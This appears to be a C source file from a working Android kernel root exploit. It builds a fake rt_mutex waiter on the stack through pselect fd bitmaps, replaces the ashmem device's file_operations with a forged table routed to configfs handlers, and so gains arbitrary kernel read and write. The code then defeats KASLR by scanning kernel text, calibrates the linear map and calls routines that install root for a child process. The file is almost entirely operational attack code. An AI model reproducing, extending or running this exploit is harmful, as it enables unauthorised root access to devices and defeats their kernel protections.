#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int walk_touched = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    /* Use the fd-bitmap encoding validated by the slide route (round-6):
     * waiter bytes 40-79 = res_out words 1-4 (task/lock/prio/deadline),
     * res_in = all zero. The old prepare_pselect_fdsets() put lock in the
     * ex bitmap, which lands at waiter+0x50 and leaves waiter->lock NULL,
     * panicking rt_mutex_adjust_prio_chain in spin_trylock. */
    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_slide_select_fdsets(&in, &out, &ex);
    open_slide_selected_fds(&in, &out, &ex, high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = 0,
      .tv_nsec = 200000000,  /* same as the validated slide pselect */
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    /* CRITICAL: the fd-bitmap-shaped stale waiter still lives on this
     * thread's kernel stack below SP. Any syscall (write/pr_info) before
     * the consumer punch lands would clobber it, and clearing go now
     * would make the consumer miss the window entirely. Hold go=1 and
     * busy-wait (yield only) until the punch has completed, exactly like
     * the validated slide route. */
    /* The PI chain walk over the fake waiter/lock/task can legitimately
     * take seconds in-kernel; measured runs show sched_setattr returning
     * AFTER the waiter's old spin caps expired. Wait unboundedly for the
     * punch to complete: the syscall provably returns, and bailing early
     * both logs stale values and skips try_cfi_stage via route_signal. */
    long punch_wait = 0;
    for (volatile long spin = 0; spin < 32000000000L; spin++, punch_wait++) {
      if (atomic_load(&consumer_calls) > 0) break;
      if (punch_wait == 400000000L) {
        pr_warning("punch first wait timeout calls=%d\n",
                   atomic_load(&consumer_calls));
      }
      __asm__ volatile("yield" ::: "memory");
    }
    for (volatile long spin2 = 0; spin2 < 64000000000L; spin2++, punch_wait++) {
      if (atomic_load(&consumer_calls) > 0 &&
          atomic_load(&consumer_inflight) == 0) {
        break;
      }
      if (punch_wait == 800000000L) {
        pr_warning("punch completion wait timeout calls=%d inflight=%d\n",
                   atomic_load(&consumer_calls),
                   atomic_load(&consumer_inflight));
        break;
      }
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    uint32_t leak = ks_leak_readback();
    walk_touched = ks_leak_walk_touched;
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
            "delay=%d last_sched_ret=%d last_sched_errno=%d "
            "walk_touched=%d leak=%08x\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            atomic_load(&consumer_last_ret),
            atomic_load(&consumer_last_errno), walk_touched, leak);

    int route_signal = calls > 0 && success > 0;
    if (route_signal && !walk_touched) {
      cfi_last_step = 36;
      cfi_last_errno = 0;
      pr_error("pselect walk probe miss attempt=%d/%d; refusing cfi probe\n",
               route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS);
    } else if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    /* A step=4 failure means the fops readback at data_addr did not see
     * fake_fops: the selected delta candidate is wrong.  The punch walk
     * already wrote one qword to the wrong linear address; retrying with
     * the same delta would corrupt more, so stop the route here. */
    if (cfi_last_step == 4) {
      pr_error("delta candidate failed step=4 (fops readback mismatch); "
               "stopping route to avoid corrupting writes\n");
      break;
    }
    if (route_verified || cfi_dirty_seen || !route_signal ||
        (route_signal && !walk_touched)) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
#ifdef CFGOPS_4_19_STYLE
    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#else
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#endif
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

static int scan_kaslr_base(int fd) {
  /* Scan the kernel text region for the ashmem fops table.  The open
   * pointer at kaslr_base + ASHMEM_FOPS_OFF + FOPS_OPEN_OFF must satisfy
   * open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) == kaslr_base, which is a
   * strong self-consistency check (a random read won't produce it). */
  const uintptr_t scan_step = 0x200000; /* 2MB (SWAPPER_BLOCK_SIZE) */
  const uintptr_t scan_max = 0x200000000ULL; /* 8GB slide range */
  for (uintptr_t base = KIMAGE_TEXT_BASE;
       base < KIMAGE_TEXT_BASE + scan_max; base += scan_step) {
    kaslr_base = base;
    uintptr_t fops_addr = kaslr_base + ASHMEM_FOPS_OFF;
    uint64_t open_ptr = kernel_read64(fd, fops_addr + FOPS_OPEN_OFF);
    if (!is_kernel_ptr(open_ptr))
      continue;
    if (open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) != base)
      continue;
    pr_info("kaslr scan hit base=%016llx slide=%016llx\n",
            (unsigned long long)base,
            (unsigned long long)(base - KIMAGE_TEXT_BASE));
    return 1;
  }
  kaslr_base = 0;
  return 0;
}

int leak_kernel_base(int fd) {
  /* When slide didn't run (alioth pselect route is dead), kaslr_base is
   * zero; scan the text region for the ashmem fops table instead. */
  if (!kaslr_base) {
    if (!scan_kaslr_base(fd)) {
      kaslr_step = 20;
      return 0;
    }
  }
  /* The p0 phys|PAGE_OFFSET data alias is invalid when the vendor kernel
   * randomizes the linear map; kaslr_base is already known here because
   * slide_leak_kernel_base() (pselect route, VA-only) runs first. */
  kaslr_fops_alias = kaslr_base + ASHMEM_FOPS_OFF;
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  /* calibrate the real linear map base from memstart_addr:
   * VA(phys) = phys - memstart_addr + PAGE_OFFSET  =>  base = PAGE_OFFSET - memstart */
  uint64_t memstart = kernel_read64(fd, kaslr_base + MEMSTART_ADDR_OFF);
  if (memstart) {
    extern uintptr_t g_direct_map_base;
    g_direct_map_base = (uintptr_t)((int64_t)P0_PAGE_OFFSET - (int64_t)memstart);
    pr_success("direct map calibrated memstart=%016llx base=%016zx "
               "(mm phys would be %016llx)\n",
               (unsigned long long)memstart, g_direct_map_base,
               (unsigned long long)(0xffffffcca4a2f800ULL - g_direct_map_base));
  }
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  if (getenv("KS_W1_TEST")) {
    uint64_t original_fops = canon_addr(ASHMEM_FOPS);
    ssize_t restore = configfs_write_once(
        fd, misc_fops, &original_fops, sizeof(original_fops));
    cfi_restore_ret = restore;
    uint64_t after = 0;
    ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
    fops_after = after;
    uint64_t null_owner = 0;
    ssize_t owner =
      configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
    cfi_owner_ret = owner;
    SYSCHK(close(fd));

    if (restore == (ssize_t)sizeof(original_fops) &&
        ra == (ssize_t)sizeof(after) &&
        after == original_fops &&
        owner == (ssize_t)sizeof(null_owner)) {
      cfi_last_step = 0;
      cfi_last_errno = 0;
      atomic_store(&cfi_stage_done, 1);
      pr_success("KS_W1_TEST primitive ok write=%zd read=%zd restore=%zd "
                 "after=%016llx owner=%zd\n", cfi_write_ret, cfi_read_ret,
                 restore, (unsigned long long)after, owner);
      return 1;
    }
    cfi_last_step = 35;
    cfi_last_errno = errno;
    pr_error("KS_W1_TEST restore failed restore=%zd read=%zd after=%016llx "
             "owner=%zd errno=%d\n", restore, ra,
             (unsigned long long)after, owner, errno);
    return 0;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  /* boot_id restore is cosmetic; non-fatal (slide may not have run, or
   * the sysctl address may be wrong in the no-slide path). */
  restore_slide_boot_id(fd);

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
